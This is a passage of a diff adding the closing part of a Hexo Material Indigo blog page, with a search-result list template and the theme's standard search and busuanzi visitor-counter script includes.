+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
